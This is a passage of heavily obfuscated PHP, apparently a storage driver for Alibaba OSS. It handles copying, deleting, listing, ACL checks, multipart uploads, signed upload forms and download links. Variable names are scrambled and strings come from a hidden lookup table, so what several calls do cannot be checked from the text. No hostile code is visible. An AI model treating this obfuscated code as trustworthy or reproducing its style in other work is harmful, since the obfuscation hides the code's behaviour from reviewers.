1, 1) == $‹›—¥äî[8] ? !0 : !1; $‚Üëêåá = array($‹›—¥äî[78] => $¡Š†¦£, $‹›—¥äî[1443] => $¡Š†¦£, $‹›—¥äî[87] => strtotime($îô¹„™¦), $‹›—¥äî[1444] => $îô¹„™¦, $‹›—¥äî[1442] => $¾«óÈíÃ); $this->cacheMethodInfoSet($£âØíØ, $ŸÔ¿åìü, $‚Üëêåá); if ($ŸÔ¿åìü) { $ÎÑ—ô°[] = $£âØíØ; continue; } $İ¿À¿†Ú[] = $Š„«û÷Í; } foreach ($»ÅÆËÌö as $•ÏÄ…Ëı) { $ÎÑ—ô°[] = $•ÏÄ…Ëı->getPrefix(); $this->cacheMethodInfoSet($•ÏÄ…Ëı->getPrefix(), !0); } if ($ûœø¥ÈÉ === $‹›—¥äî[12]) { break; } } $this->cacheMethodInfoSet($†üÆ¥Á, !0); return array($‹›—¥äî[84] => $ÎÑ—ô°, $‹›—¥äî[85] => $İ¿À¿†Ú); } public function copyFile($¸©ö©õ¾, $ÎÙ¥÷Ö) { $Ñí”ø¦¤ = $this->size($¸©ö©õ¾); if ($Ñí”ø¦¤ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¸©ö©õ¾, $this->bucket, $this->pathEncode($ÎÙ¥÷Ö)); } catch (OSS\Core\OssException $çæŒÔí) { return !1; } return $this->getPathOuter($ÎÙ¥÷Ö); } $Üé´ØÑ‹ = $this->multiCopyObject($¸©ö©õ¾, $ÎÙ¥÷Ö, $Ñí”ø¦¤); return $Üé´ØÑ‹ ? $this->getPathOuter($ÎÙ¥÷Ö) : !1; } private function multiCopyObject($±²¿ğ¨³, $»‡ ³¢Ë, $ã¦­ëÁ) { $èï´¯í =& $_SERVER[Î‹ÃÂŞ„]; try { $çÁüÙ®É = array(); if ($¶Ûò¡›× = $this->hashMd5($±²¿ğ¨³)) { $çÁüÙ®É = array(OSS\OssClient::OSS_HEADERS => array($èï´¯í[1445] => $¶Ûò¡›×)); } $€ƒÌÏ˜ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($»‡ ³¢Ë), $çÁüÙ®É); $øÀ¥’ß´ = 1; $·çÜ«¶Ë = 0; $Õí®€ = array(); $İªÆ©×Ê = 1024 * 1024 * 10; $‡Ÿ•œ•ú = $this->client->generateMultiuploadParts($ã¦­ëÁ, $İªÆ©×Ê); foreach ($‡Ÿ•œ•ú as $–Ü†ÒÓô => $«¥æÕŒİ) { $•ì±ÛÎç = $·çÜ«¶Ë + (int) $«¥æÕŒİ[$èï´¯í[1446]]; $ã¹ªï¶ = (int) $«¥æÕŒİ[$èï´¯í[383]] + $•ì±ÛÎç - 1; $¼ƒ£¸ÌÛ = array($èï´¯í[1447] => $•ì±ÛÎç, $èï´¯í[1448] => $ã¹ªï¶); $Õí®€[] = $this->client->uploadPartCopy($this->bucket, $±²¿ğ¨³, $this->bucket, $this->pathEncode($»‡ ³¢Ë), $øÀ¥’ß´, $€ƒÌÏ˜, $¼ƒ£¸ÌÛ); $øÀ¥’ß´ = $øÀ¥’ß´ + 1; } $Íú‡Åş­ = array(); foreach ($Õí®€ as $–Ü†ÒÓô => $âªÜ€œú) { $Íú‡Åş­[] = array($èï´¯í[1449] => $–Ü†ÒÓô + 1, $èï´¯í[1450] => $âªÜ€œú); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($»‡ ³¢Ë), $€ƒÌÏ˜, $Íú‡Åş­); } catch (OSS\Core\OssException $šÔ¹ÍÓ) { return !1; } return !0; } public function moveFile($ºÙâßª, $–«ÊöÂº) { if ($this->copyFile($ºÙâßª, $–«ÊöÂº)) { $this->remove($ºÙâßª); return $this->getPathOuter($–«ÊöÂº); } return !1; } public function delFile($ÕúåŒˆŠ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÕúåŒˆŠ)); } catch (OSS\Core\OssException $ÈÓ‰úáÓ) { return !1; } return !0; } public function delFolder($†ç‰®’õ) { $²¼ÀÌ™õ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->exist($†ç‰®’õ)) { return !0; } $this->listItemCache = !1; $„Óã¼ø = $this->fileList($†ç‰®’õ); $this->listItemCache = !0; $ÅåÄäŠ = trim($†ç‰®’õ, $²¼ÀÌ™õ[8]) . $²¼ÀÌ™õ[8]; if (!empty($†ç‰®’õ) && $†ç‰®’õ !== $²¼ÀÌ™õ[214] && !in_array($ÅåÄäŠ, $„Óã¼ø[$²¼ÀÌ™õ[84]])) { $„Óã¼ø[$²¼ÀÌ™õ[84]][] = $ÅåÄäŠ; } $ÕòÉ‹ú = $this->delByBatch($„Óã¼ø[$²¼ÀÌ™õ[85]]); if (!$ÕòÉ‹ú) { return !1; } $ÕòÉ‹ú = $this->delByBatch($„Óã¼ø[$²¼ÀÌ™õ[84]]); if (!$ÕòÉ‹ú) { return !1; } return $this->delFile($ÅåÄäŠ); } private function delByBatch($†ºéõñÏ) { foreach (array_chunk($†ºéõñÏ, 1000) as $îó•Ùé©) { try { $this->client->deleteObjects($this->bucket, $îó•Ùé©); } catch (OSS\Core\OssException $œ‡Â¡Æ‘) { return !1; } } return !0; } public function rename($¸‰è²ó, $ÄÎ»€·) { return $this->renameObject($¸‰è²ó, $ÄÎ»€·); } private function fileInfo($²¨Ûé ®, $§¶ÚÛŞ = false, $–®À‘‹ã = array()) { $¤¸ÎËµ˜ =& $_SERVER[Î‹ÃÂŞ„]; $«çÎÒÒ = array($¤¸ÎËµ˜[32] => $this->pathThis($²¨Ûé ®), $¤¸ÎËµ˜[86] => $this->getPathOuter($²¨Ûé ®), $¤¸ÎËµ˜[33] => $¤¸ÎËµ˜[216], $¤¸ÎËµ˜[78] => isset($–®À‘‹ã[$¤¸ÎËµ˜[78]]) ? $–®À‘‹ã[$¤¸ÎËµ˜[78]] : 0, $¤¸ÎËµ˜[177] => $this->ext($²¨Ûé ®)); if ($§¶ÚÛŞ) { return $«çÎÒÒ; } $«çÎÒÒ[$¤¸ÎËµ˜[217]] = $«çÎÒÒ[$¤¸ÎËµ˜[87]] = 0; $«çÎÒÒ[$¤¸ÎËµ˜[218]] = $«çÎÒÒ[$¤¸ÎËµ˜[219]] = !0; if (empty($–®À‘‹ã)) { $ÎºõÁ = $this->objectMeta($²¨Ûé ®); if (!$ÎºõÁ) { return $«çÎÒÒ; } $–®À‘‹ã = array($¤¸ÎËµ˜[87] => strtotime($ÎºõÁ[$¤¸ÎËµ˜[1444]]), $¤¸ÎËµ˜[78] => $ÎºõÁ[$¤¸ÎËµ˜[1443]] + 0, $¤¸ÎËµ˜[1442] => $ÎºõÁ[$¤¸ÎËµ˜[1442]]); } if (isset($–®À‘‹ã[$¤¸ÎËµ˜[1442]]) && $–®À‘‹ã[$¤¸ÎËµ˜[1442]]) { $«çÎÒÒ[$¤¸ÎËµ˜[221]] = trim($–®À‘‹ã[$¤¸ÎËµ˜[1442]], $¤¸ÎËµ˜[120]); } if (isset($–®À‘‹ã[$¤¸ÎËµ˜[78]])) { $«çÎÒÒ[$¤¸ÎËµ˜[78]] = $–®À‘‹ã[$¤¸ÎËµ˜[78]]; } if (isset($–®À‘‹ã[$¤¸ÎËµ˜[87]])) { $«çÎÒÒ[$¤¸ÎËµ˜[87]] = $–®À‘‹ã[$¤¸ÎËµ˜[87]]; } if (isset($–®À‘‹ã[$¤¸ÎËµ˜[196]]) && !trim($«çÎÒÒ[$¤¸ÎËµ˜[87]])) { $«çÎÒÒ[$¤¸ÎËµ˜[87]] = $–®À‘‹ã[$¤¸ÎËµ˜[196]]; } return $«çÎÒÒ; } private function folderInfo($Š §ÍÂ—, $¤®„–î = false, $şıŒâÒ¡ = array()) { $¸ˆƒ÷§ =& $_SERVER[Î‹ÃÂŞ„]; $©æ‚¸Ì = array($¸ˆƒ÷§[32] => $this->pathThis($Š §ÍÂ—), $¸ˆƒ÷§[86] => $this->getPathOuter($¸ˆƒ÷§[8] . $Š §ÍÂ—), $¸ˆƒ÷§[33] => $¸ˆƒ÷§[77]); if ($¤®„–î) { return $©æ‚¸Ì; } $©æ‚¸Ì[$¸ˆƒ÷§[217]] = $©æ‚¸Ì[$¸ˆƒ÷§[87]] = 0; $©æ‚¸Ì[$¸ˆƒ÷§[218]] = $©æ‚¸Ì[$¸ˆƒ÷§[219]] = !0; if (empty($şıŒâÒ¡)) { $Š §ÍÂ— = rtrim($Š §ÍÂ—, $¸ˆƒ÷§[8]) . $¸ˆƒ÷§[8]; $Ã…Š²ñ¼ = $this->objectMeta($Š §ÍÂ—); if (!$Ã…Š²ñ¼) { return $©æ‚¸Ì; } $şıŒâÒ¡ = array($¸ˆƒ÷§[217] => $Ã…Š²ñ¼[$¸ˆƒ÷§[547]][$¸ˆƒ÷§[1451]], $¸ˆƒ÷§[87] => strtotime($Ã…Š²ñ¼[$¸ˆƒ÷§[1444]])); } if (isset($şıŒâÒ¡[$¸ˆƒ÷§[87]])) { $©æ‚¸Ì[$¸ˆƒ÷§[87]] = $şıŒâÒ¡[$¸ˆƒ÷§[87]]; } if (isset($şıŒâÒ¡[$¸ˆƒ÷§[217]])) { $©æ‚¸Ì[$¸ˆƒ÷§[217]] = $şıŒâÒ¡[$¸ˆƒ÷§[217]]; } return $©æ‚¸Ì; } public function listPath($œï‰Ôƒ, $‹åÂéù± = false) { $£Ë€¤½è =& $_SERVER[Î‹ÃÂŞ„]; $ÅáüÉ = $this->fileList($œï‰Ôƒ, $£Ë€¤½è[8], !0); foreach ($ÅáüÉ[$£Ë€¤½è[84]] as $µËîÛŠ => $á€ÁŒå„) { $ÅáüÉ[$£Ë€¤½è[84]][$µËîÛŠ] = $this->folderInfo($á€ÁŒå„, $‹åÂéù±, $á€ÁŒå„); } foreach ($ÅáüÉ[$£Ë€¤½è[85]] as $µËîÛŠ => $á€ÁŒå„) { $ÅáüÉ[$£Ë€¤½è[85]][$µËîÛŠ] = $this->fileInfo($á€ÁŒå„[$£Ë€¤½è[32]], $‹åÂéù±, $á€ÁŒå„); } return $ÅáüÉ; } protected function infoChildren($»ë±ğ–¡, &$Ò²ü»ø) { $ğ¿¨ÈÜï =& $_SERVER[Î‹ÃÂŞ„]; $ëºç¸àÆ = $this->fileList($»ë±ğ–¡, $ğ¿¨ÈÜï[12], !0); $Ò²ü»ø[$ğ¿¨ÈÜï[80]] += count($ëºç¸àÆ[$ğ¿¨ÈÜï[84]]); $Ò²ü»ø[$ğ¿¨ÈÜï[79]] += count($ëºç¸àÆ[$ğ¿¨ÈÜï[85]]); foreach ($ëºç¸àÆ[$ğ¿¨ÈÜï[85]] as $š‹İÛŒ§) { if (!$š‹İÛŒ§ || !$š‹İÛŒ§[$ğ¿¨ÈÜï[78]]) { continue; } $Ò²ü»ø[$ğ¿¨ÈÜï[78]] += $š‹İÛŒ§[$ğ¿¨ÈÜï[78]]; } } public function has($íç™ê‚Ç, $ğ¹Ğ‹‘‰ = false, $ò´¢¢ß = true) { $³Ò­ÙÄ =& $_SERVER[Î‹ÃÂŞ„]; $íç™ê‚Ç = trim($íç™ê‚Ç, $³Ò­ÙÄ[8]); $ñô˜©ï = empty($íç™ê‚Ç) && $íç™ê‚Ç !== $³Ò­ÙÄ[214] ? $³Ò­ÙÄ[12] : $íç™ê‚Ç . $³Ò­ÙÄ[8]; $æï¤¨ÎŠ = $³Ò­ÙÄ[12]; $ø€üâ† = 500; $ìç¶ÍØ = $× ·Í”½ = 0; while (!0) { check_abort(); $š¾€ó¾Ó = array($³Ò­ÙÄ[1438] => $³Ò­ÙÄ[8], $³Ò­ÙÄ[1439] => $ñô˜©ï, $³Ò­ÙÄ[1440] => $ø€üâ†, $³Ò­ÙÄ[1441] => $æï¤¨ÎŠ); try { $ª„Â†á’ = $this->client->listObjects($this->bucket, $š¾€ó¾Ó); } catch (OSS\Core\OssException $Ÿš§ŸÖã) { break; } $æï¤¨ÎŠ = $ª„Â†á’->getNextMarker(); $µôè”¦½ = $ª„Â†á’->getObjectList(); $‡÷ÜÜ¨ = $ª„Â†á’->getPrefixList(); if ($ğ¹Ğ‹‘‰) { if (count($µôè”¦½) > 1 || count($µôè”¦½) == 1 && $µôè”¦½[0]->getKey() != $ñô˜©ï) { $ìç¶ÍØ += count($µôè”¦½) - 1; } if (!empty($‡÷ÜÜ¨)) { $× ·Í”½ += count($‡÷ÜÜ¨); } if ($æï¤¨ÎŠ === $³Ò­ÙÄ[12]) { break; } continue; } if ($ò´¢¢ß) { if (!empty($µôè”¦½)) { if (count($µôè”¦½) > 1 || $µôè”¦½[0]->getKey() != $ñô˜©ï) { return !0; } } } else { if (!empty($‡÷ÜÜ¨)) { return !0; } } if ($æï¤¨ÎŠ === $³Ò­ÙÄ[12]) { break; } } if ($ğ¹Ğ‹‘‰) { return array($³Ò­ÙÄ[225] => $ìç¶ÍØ, $³Ò­ÙÄ[226] => $× ·Í”½); } return !1; } public function listAll($×ûîÓÕÄ) { $ÂÊììê× =& $_SERVER[Î‹ÃÂŞ„]; $íïó•îù = $this->fileList($×ûîÓÕÄ, $ÂÊììê×[12], !0); $ò×³‚»€ = array_to_keyvalue($íïó•îù[$ÂÊììê×[85]], $ÂÊììê×[32]); foreach ($íïó•îù[$ÂÊììê×[84]] as $ŒÆÆÓï¢) { if (is_string($ŒÆÆÓï¢)) { $ò×³‚»€[$ŒÆÆÓï¢] = array($ÂÊììê×[78] => 0); } } return $this->listAllFiles($×ûîÓÕÄ, $ò×³‚»€); } public function canRead($à‰ã˜Ê¼) { $³ÖãúÌª =& $_SERVER[Î‹ÃÂŞ„]; $ë”Øéƒ± = $this->pathAcl($à‰ã˜Ê¼); return $ë”Øéƒ± == $³ÖãúÌª[1452] || $ë”Øéƒ± == $³ÖãúÌª[590] ? !0 : !1; } public function canWrite($˜³ĞŸ‘õ) { $»ØØ»œÄ = $this->pathAcl($˜³ĞŸ‘õ); return $»ØØ»œÄ == $_SERVER[Î‹ÃÂŞ„][590] ? !0 : !1; } public function pathAcl($§‘ÉÒŞá) { $×ÅıÕÑ§ =& $_SERVER[Î‹ÃÂŞ„]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Âø¦©¦ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($§‘ÉÒŞá)); } catch (OSS\Core\OssException $¶§Æóß¬) { return !1; } $œéÇõàû = $Âø¦©¦ == $×ÅıÕÑ§[37] ? $this->bucketAcl : $Âø¦©¦; if ($œéÇõàû == $×ÅıÕÑ§[1453]) { return $×ÅıÕÑ§[1452]; } if ($œéÇõàû == $×ÅıÕÑ§[1454]) { return $×ÅıÕÑ§[590]; } return $œéÇõàû; } private function chmodPath($¹Ø¡±ä“, $Œ×£À‡ = '') { $€ãşÊâ¤ =& $_SERVER[Î‹ÃÂŞ„]; $òÊúõ‰ = empty($Œ×£À‡) ? $€ãşÊâ¤[1454] : $Œ×£À‡; $¶ÂÁªÙœ = array($€ãşÊâ¤[37], $€ãşÊâ¤[215], $€ãşÊâ¤[1453], $€ãşÊâ¤[1454]); if (!in_array($òÊúõ‰, $¶ÂÁªÙœ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¹Ø¡±ä“), $òÊúõ‰); } catch (OSS\Core\OssException $ƒö§Öì¨) { return !1; } return !0; } public function getContent($°ª‹â¥È) { return $this->fileSubstr($°ª‹â¥È, -1); } public function setContent($¯¨¤áê, $Ş¦°ş·  = '') { $“Ï·Åøº =& $_SERVER[Î‹ÃÂŞ„]; try { $¸Ô‘ßéÛ = $this->trafficLimit($“Ï·Åøº[1455]); $¸ğ¼ÈŒç = $this->client->putObject($this->bucket, $this->pathEncode($¯¨¤áê), $Ş¦°ş· , $¸Ô‘ßéÛ); } catch (OSS\Core\OssException $ØÈ‡ú˜) { return !1; } $ÂµûÌ»¸ = array($“Ï·Åøº[1445] => trim($¸ğ¼ÈŒç[$“Ï·Åøº[1442]], $“Ï·Åøº[120]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¯¨¤áê))); $this->updateObjMeta($¯¨¤áê, $ÂµûÌ»¸); return isset($¸ğ¼ÈŒç[$“Ï·Åøº[1456]][$“Ï·Åøº[277]]) ? !0 : !1; } private function updateObjMeta($²ŸÇ«§Æ, $ö­²¢ªí) { $²ŸÇ«§Æ = $this->pathEncode($²ŸÇ«§Æ); try { $•œ•ö¶ = array(OSS\OssClient::OSS_HEADERS => $ö­²¢ªí); $this->client->copyObject($this->bucket, $²ŸÇ«§Æ, $this->bucket, $²ŸÇ«§Æ, $•œ•ö¶); } catch (OSS\Core\OssException $·¾¡Êˆ) { return !1; } return !0; } public function upload($êöíƒâÚ, $¬ö¾ŒµÎ, $Ë¥³Õ²‹ = false, $¾ñòÆü = REPEAT_REPLACE) { $¤‘±Ï¥ =& $_SERVER[Î‹ÃÂŞ„]; $’Ğšìİ = trim($êöíƒâÚ, $¤‘±Ï¥[8]); $Íˆ·ÛÄ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¤‘±Ï¥[1445] => @md5_file($¬ö¾ŒµÎ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($êöíƒâÚ))); $Íˆ·ÛÄ = $this->trafficLimit($¤‘±Ï¥[1455], $Íˆ·ÛÄ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($’Ğšìİ), $¬ö¾ŒµÎ, $Íˆ·ÛÄ); } catch (OSS\Core\OssException $ı¨ã¯°Ô) { return !1; } return $this->getPathOuter($êöíƒâÚ); } public function getHost() { $»õãÉ =& $_SERVER[Î‹ÃÂŞ„]; $ÁÒâ•”ª = explode($»õãÉ[200], parent::getHost()); return $ÁÒâ•”ª[0] . $»õãÉ[200] . $this->bucket . $»õãÉ[10] . $ÁÒâ•”ª[1]; } public function uploadFormData($ÍıÏ¸’ˆ, $Á·Œ = 3600) { $Ò¬¢Å¥ì =& $_SERVER[Î‹ÃÂŞ„]; if (!($ÅÈÉ™š = $this->getHost())) { return !1; } $àú’§î = $Á·Œ; $ùşÔë·° = date($Ò¬¢Å¥ì[1457], time() + $àú’§î); $Ö€§“âé = new DateTime($ùşÔë·°); $¦ë˜Öˆä = $Ö€§“âé->format(DateTime::ISO8601); $œéø®«ú = strpos($¦ë˜Öˆä, $Ò¬¢Å¥ì[342]); $¦ë˜Öˆä = substr($¦ë˜Öˆä, 0, $œéø®«ú) . $Ò¬¢Å¥ì[1458]; $Ï†ûµ½è = 1048576000 * 5; $ó¡¸¦× = $this->pathFather($ÍıÏ¸’ˆ); $Òëüšˆ = array($Ò¬¢Å¥ì[260] => $¦ë˜Öˆä, $Ò¬¢Å¥ì[263] => array(array($Ò¬¢Å¥ì[1459], 0, $Ï†ûµ½è), array($Ò¬¢Å¥ì[266], $Ò¬¢Å¥ì[267], $ó¡¸¦×))); $œ³¡ø¡´ = base64_encode(json_encode($Òëüšˆ)); $å×É¶’­ = base64_encode(hash_hmac($Ò¬¢Å¥ì[249], $œ³¡ø¡´, $this->secret, !0)); $‰Ÿş—Ô = array($Ò¬¢Å¥ì[278] => $œ³¡ø¡´, $Ò¬¢Å¥ì[1460] => $this->accessKey, $Ò¬¢Å¥ì[270] => $Ò¬¢Å¥ì[259], $Ò¬¢Å¥ì[1461] => $å×É¶’­, $Ò¬¢Å¥ì[198] => $ÅÈÉ™š); $‰Ÿş—Ô = $this->trafficLimit($Ò¬¢Å¥ì[1455], $‰Ÿş—Ô); return $‰Ÿş—Ô; } public function multiUploadFormData($Çøâ´è, $¥ì®ç®ü = 3600) { $È¾ÍÇ”¤ =& $_SERVER[Î‹ÃÂŞ„]; if (!($¨ø×¼ëï = $this->getHost())) { return !1; } $Î¿æèÜ = $this->trafficLimit($È¾ÍÇ”¤[1455]); $¹öÎÇÇÙ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Çøâ´è), $Î¿æèÜ); return array($È¾ÍÇ”¤[240] => $¹öÎÇÇÙ, $È¾ÍÇ”¤[198] => $¨ø×¼ëï . $È¾ÍÇ”¤[8] . $this->pathEncode($Çøâ´è), $È¾ÍÇ”¤[241] => gmdate($È¾ÍÇ”¤[1462]), $È¾ÍÇ”¤[96] => $Çøâ´è); } public function multiUploadAuthData($×È¯°, $ºà—®Êº = array()) { $ŸÆãÏ‰Š =& $_SERVER[Î‹ÃÂŞ„]; $éè¯‰öĞ = isset($ºà—®Êº[$ŸÆãÏ‰Š[241]]) ? $ºà—®Êº[$ŸÆãÏ‰Š[241]] : gmdate($ŸÆãÏ‰Š[1462]); $Í‡£¥ü = isset($ºà—®Êº[$ŸÆãÏ‰Š[177]]) ? $ºà—®Êº[$ŸÆãÏ‰Š[177]] : $ŸÆãÏ‰Š[12]; $ ïÙÆ©É = $×È¯°; if (isset($ºà—®Êº[$ŸÆãÏ‰Š[96]])) { $ ïÙÆ©É = $ºà—®Êº[$ŸÆãÏ‰Š[96]]; unset($ºà—®Êº[$ŸÆãÏ‰Š[96]]); } if (isset($ºà—®Êº[$ŸÆãÏ‰Š[242]])) { $ºà—®Êº[$ŸÆãÏ‰Š[241]] = $éè¯‰öĞ; return $this->listUploadParts($ ïÙÆ©É, $ºà—®Êº); } $É¾‰úÍÌ = array($ŸÆãÏ‰Š[243], $ŸÆãÏ‰Š[12], $ŸÆãÏ‰Š[122], $éè¯‰öĞ, "\x78\x2d\x6f\163\163\x2d\144\x61\x74\x65\72{$éè¯‰öĞ}", $ŸÆãÏ‰Š[8] . $this->bucket . $ŸÆãÏ‰Š[8] . $ ïÙÆ©É . $Í‡£¥ü); if (strpos($Í‡£¥ü, $ŸÆãÏ‰Š[244]) === 0) { $É¾‰úÍÌ[0] = $ŸÆãÏ‰Š[245]; if ($ÒìŸãóÒ = $this->trafficLimit($ŸÆãÏ‰Š[1455])) { $ ïÙÆ©É = $ŸÆãÏ‰Š[1463]; array_splice($É¾‰úÍÌ, 5, 0, $ ïÙÆ©É . $ŸÆãÏ‰Š[4] . $ÒìŸãóÒ[$ ïÙÆ©É]); } } if (isset($ºà—®Êº[$ŸÆãÏ‰Š[246]]) && $ºà—®Êº[$ŸÆãÏ‰Š[246]] == $ŸÆãÏ‰Š[247]) { $É¾‰úÍÌ[0] = $ŸÆãÏ‰Š[247]; } if (!empty($ºà—®Êº[$ŸÆãÏ‰Š[1464]])) { $•¹§ş—à = array_merge(array($É¾‰úÍÌ[4]), $ºà—®Êº[$ŸÆãÏ‰Š[1464]]); sort($•¹§ş—à); $É¾‰úÍÌ[4] = implode($ŸÆãÏ‰Š[248], $•¹§ş—à); } $”‹Û— = implode($ŸÆãÏ‰Š[248], $É¾‰úÍÌ); $–…ãÍØİ = base64_encode(hash_hmac($ŸÆãÏ‰Š[249], $”‹Û—, $this->secret, !0)); $Å—¹ÒÏ = $ŸÆãÏ‰Š[1428] . $this->accessKey . $ŸÆãÏ‰Š[4] . $–…ãÍØİ; if (strpos($Í‡£¥ü, $ŸÆãÏ‰Š[244]) === 0) { $Å—¹ÒÏ = array($ŸÆãÏ‰Š[251] => $Å—¹ÒÏ, $ŸÆãÏ‰Š[241] => $éè¯‰öĞ); if ($ÒìŸãóÒ) { $Å—¹ÒÏ = array_merge($Å—¹ÒÏ, $ÒìŸãóÒ); } } return $Å—¹ÒÏ; } public function listUploadParts($ ó—¢º, $‡Â±¢ä) { $â–¦°° =& $_SERVER[Î‹ÃÂŞ„]; $Ş¹ƒ©º = parse_url_query($‡Â±¢ä[$â–¦°°[177]]); $ñú±¼Òš = $this->client->listParts($this->bucket, $this->pathEncode($ ó—¢º), $Ş¹ƒ©º[$â–¦°°[240]]); $ë¹¡¸”ò = $ñú±¼Òš->getListPart(); $°¹üÖ÷ = array(); foreach ($ë¹¡¸”ò as $Î£•ü€) { $°¹üÖ÷[] = array($â–¦°°[1449] => $Î£•ü€->getPartNumber(), $â–¦°°[1450] => trim($Î£•ü€->getETag(), $â–¦°°[120])); } unset($‡Â±¢ä[$â–¦°°[242]], $‡Â±¢ä[$â–¦°°[246]]); $ê¹Ãß– = $this->multiUploadAuthData($ ó—¢º, $‡Â±¢ä); if (empty($ê¹Ãß–)) { return !1; } return array($â–¦°°[251] => $ê¹Ãß–, $â–¦°°[241] => $‡Â±¢ä[$â–¦°°[241]], $â–¦°°[253] => $°¹üÖ÷); } public function download($ÀŠœÉö´, $†ãÊ™ìÄ) { if ($this->isFolder($ÀŠœÉö´)) { return !1; } try { $æÌ®™µÜ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $†ãÊ™ìÄ); $æÌ®™µÜ = $this->trafficLimit($_SERVER[Î‹ÃÂŞ„][111], $æÌ®™µÜ); $this->client->getObject($this->bucket, $this->pathEncode($ÀŠœÉö´), $æÌ®™µÜ); } catch (OSS\Core\OssException $ÛŸäÖ½…) { return !1; } return $†ãÊ™ìÄ; } public function fileSubstr($Ã™æßİï, $½Üó·Ì = 0, $°â™í´ = false) { if ($½Üó·Ì === -1) { $€˜ºĞÅ = array(); } else { if ($°â™í´ === !1) { $çÚõÒ€ = $this->size($Ã™æßİï); } else { $çÚõÒ€ = $½Üó·Ì + $°â™í´ - 1; } $€˜ºĞÅ = array(OSS\OssClient::OSS_RANGE => "{$½Üó·Ì}\55{$çÚõÒ€}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ã™æßİï), $€˜ºĞÅ); } catch (OSS\Core\OssException $éƒÙëøı) { think_exception($éƒÙëøı->getMessage()); return !1; } } private function trafficLimit($åŠìûİ¯, $è³ªÌÀˆ = array()) { $ïûè‡Ò• =& $_SERVER[Î‹ÃÂŞ„]; if ($åŠìûİ¯ == $ïûè‡Ò•[1455] && $this->isUploadServer() || $åŠìûİ¯ == $ïûè‡Ò•[111] && $this->isFileOutServer()) { return $è³ªÌÀˆ; } $šòÄƒî = floatval($GLOBALS[$ïûè‡Ò•[6]][$ïûè‡Ò•[91]][$ïûè‡Ò•[109]][$åŠìûİ¯]) * 1024 * 1024 * 8; if (!$šòÄƒî) { return $è³ªÌÀˆ; } $šòÄƒî = $šòÄƒî < 819200 ? 819200 : ($šòÄƒî > 838860800 ? 838860800 : $šòÄƒî); $è³ªÌÀˆ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($šòÄƒî); return $è³ªÌÀˆ; } public function link($½™ƒ¶òõ, $Å¼éµ×æ = array()) { $š«áä– =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->exist($½™ƒ¶òõ) || $this->isFolder($½™ƒ¶òõ)) { return !1; } try { $Å¼éµ×æ = $this->trafficLimit($š«áä–[111], $Å¼éµ×æ); $ÇèÎßÜù = $this->client->signUrl($this->bucket, $this->pathEncode($½™ƒ¶òõ), 3600 * 12, $š«áä–[247], $Å¼éµ×æ); return $this->getCdnLink($ÇèÎßÜù); } catch (OSS\Core\OssException $ÂúÂ˜ªé) { return !1; } } public function fileOut($¿Ò¨¯Ó, $‡–ıåçˆ = false, $¼ô¨şøÑ = false, $ïôĞÍÈó = '') { $®Î÷ËéÙ =& $_SERVER[Î‹ÃÂŞ„]; if ($this->isFileOutServer()) { return $this->fileOutServer($¿Ò¨¯Ó, $‡–ıåçˆ, $¼ô¨şøÑ, $ïôĞÍÈó); } if (!$¼ô¨şøÑ) { $¼ô¨şøÑ = $this->pathThis($¿Ò¨¯Ó); } $¼ô¨şøÑ = rawurlencode($¼ô¨şøÑ); $ÈüãÂ’Ê = get_file_mime(get_path_ext($¼ô¨şøÑ)); if ($ÈüãÂ’Ê == $®Î÷ËéÙ[234]) { return parent::fileOut($¿Ò¨¯Ó, $‡–ıåçˆ, $¼ô¨şøÑ, $ïôĞÍÈó); } $‡–ıåçˆ = $‡–ıåçˆ ? $®Î÷ËéÙ[1465] : $®Î÷ËéÙ[1466]; $¢³ªÈÒñ = array(OSS\OssClient::OSS_SUB_RESOURCE => $®Î÷ËéÙ[1467] . rawurlencode("{$‡–ıåçˆ}\73\x66\x69\x6c\145\x6e\141\155\x65\x3d{$¼ô¨şøÑ}")); $¢³ªÈÒñ[OSS\OssClient::OSS_SUB_RESOURCE] .= $®Î÷ËéÙ[1468] . rawurlencode($ÈüãÂ’Ê); $‹ºÕôÎ¯ = $this->link($¿Ò¨¯Ó, $¢³ªÈÒñ); $this->fileOutLink($‹ºÕôÎ¯); } public function fileOutServer($Âß‚°÷£, $‡§¼Ô± = false, $ØâÇø€¶ = false, $Â¼×ã¹ = '') { parent::fileOut($Âß‚°÷£, $‡§¼Ô±, $ØâÇø€¶, $Â¼×ã¹); } public function fileOutImage($ÛãìàÕÏ, $Ó¤ÍÏõÕ = 250) { if ($this->size($ÛãìàÕÏ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÛãìàÕÏ, $Ó¤ÍÏõÕ); } $­­÷¹Š¬ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Î‹ÃÂŞ„][1425] . $Ó¤ÍÏõÕ); $ÍÖÅ©¦Ì = $this->link($ÛãìàÕÏ, $­­÷¹Š¬); $this->fileOutLink($ÍÖÅ©¦Ì); } public function fileOutImageServer($÷ôìÀíŞ, $Å¶€ØÑ® = 250) { parent::fileOutImage($÷ôìÀíŞ, $Å¶€ØÑ®); } public function fileOutLink($¥Ñ©ÜÚ’) { $‡íú«„ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->isCdnHost() && substr($¥Ñ©ÜÚ’, 0, 7) == $‡íú«„[1386]) { $¥Ñ©ÜÚ’ = $‡íú«„[1387] . substr($¥Ñ©ÜÚ’, 7); } header($‡íú«„[164] . $¥Ñ©ÜÚ’); die; } public function hashMd5($˜°îõ¥´, $öÌ†ß¯µ = '') { $¥ÈØ…ß€ =& $_SERVER[Î‹ÃÂŞ„]; 